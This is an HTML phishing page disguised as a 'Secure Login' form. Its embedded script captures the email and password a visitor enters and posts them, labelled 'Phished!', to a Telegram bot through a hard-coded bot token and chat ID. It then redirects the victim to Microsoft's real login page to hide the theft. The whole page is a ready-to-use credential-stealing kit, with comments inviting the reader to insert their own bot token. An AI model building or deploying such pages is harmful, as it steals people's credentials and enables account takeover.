<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Login</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin-top: 100px; }
    input { margin: 5px; padding: 10px; width: 250px; }
    button { padding: 10px 20px; }
  </style>
</head>
<body>
  <h2>Login</h2>
  <form id="phishForm">
    <input type="email" id="email" placeholder="Email" required><br>
    <input type="password" id="password" placeholder="Password" required><br>
    <button type="submit">Login</button>
  </form>

  <script>
    document.getElementById("phishForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const botToken = "8052948220:AAFG6B09-ob7cTErbGOJHgKFRlPN4_fuk-I";  // your bot token
      const chatID = "6995564677";  // your Telegram chat ID
      const message = `Phished!\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatID,
          text: message
        })
      });

      // Optional: redirect to real site afterward
      setTimeout(() => {
        window.location.href = "https://login.microsoftonline.com";
      }, 1000);
    });
  </script>
</body>
</html>
